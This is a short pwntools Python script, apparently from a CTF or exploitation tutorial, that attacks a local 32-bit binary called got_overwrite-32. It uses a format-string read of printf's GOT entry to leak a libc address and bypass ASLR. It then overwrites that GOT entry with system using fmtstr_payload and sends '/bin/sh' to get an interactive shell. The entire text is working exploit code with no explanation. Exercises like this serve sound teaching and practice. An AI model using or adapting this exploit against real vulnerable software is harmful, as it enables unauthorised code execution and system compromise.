from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc

p = process()

# ASLR bypass
payload = b'%6$s'
payload += p32(elf.got['printf'])

p.sendline(payload)

printf_leak = u32(p.recv(4))
libc.address = printf_leak - libc.sym['printf']

p.clean()

# GOT Overwrite
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()